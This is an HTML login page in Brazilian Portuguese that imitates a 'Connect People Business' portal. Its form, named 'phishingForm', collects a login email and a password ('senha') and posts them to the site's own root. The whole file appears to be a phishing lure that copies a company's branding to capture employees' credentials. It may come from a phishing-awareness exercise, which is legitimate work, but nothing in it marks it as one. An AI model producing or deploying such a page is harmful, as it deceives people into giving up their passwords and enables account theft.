<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8"/>
  <title>Connect People Business</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #f5f5f5;
    }
    .container-fluid {
      height: 100vh;
      display: flex;
    }
    .left-panel {
      flex: 1;
      background: linear-gradient(to bottom, #3f0d7d, #9c27b0);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 40px;
    }
    .brand-header {
      display: flex;
      align-items: center;
      gap: 15px;
      margin-bottom: 10px;
    }
    .brand-header img {
      height: 50px;
    }
    .brand-header h1 {
      font-size: 2.5rem;
      margin: 0;
    }
    .left-panel p {
      font-size: 1.2rem;
      margin-top: 10px;
    }
    .right-panel {
      flex: 1;
      background-color: white;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-box {
      width: 100%;
      max-width: 400px;
      padding: 30px;
    }
    .login-box h3 {
      text-align: center;
      margin-bottom: 30px;
    }
    .btn-purple {
      background-color: #6a1b9a;
      color: white;
      border: none;
    }
    .btn-purple:hover {
      background-color: #4a148c;
    }
    .forgot-link {
      display: block;
      text-align: right;
      margin-top: 10px;
      font-size: 0.9rem;
      color: #6a1b9a;
    }
    .logo {
      display: block;
      margin: 0 auto 20px;
      max-width: 80px;
    }
  </style>
</head>
<body>
  <div class="container-fluid">
    <div class="left-panel">
      <div class="brand-header">
        <img src="img/logo.png" alt="Logo Connect" />
        <h1>connect</h1>
      </div>
      <p>People Business</p>
    </div>
    <div class="right-panel">
      <div class="login-box">
        <img src="img/logo.png" alt="Logo Connect" class="logo" />
        <h3>Bem-vindo(a) ao Connect</h3>
        <form id="phishingForm" action="/" method="POST">
          <div class="form-group">
            <label for="username">Login</label>
            <input type="text" class="form-control" id="username" name="email" required/>
          </div>
          <div class="form-group">
            <label for="password">Senha</label>
            <input type="password" class="form-control" id="password" name="senha" required/>
          </div>
          <a href="#" class="forgot-link">Esqueceu a senha?</a>
          <button type="submit" class="btn btn-purple btn-block mt-3">Entrar</button>
        </form>
      </div>
    </div>
  </div>
</body>
</html>
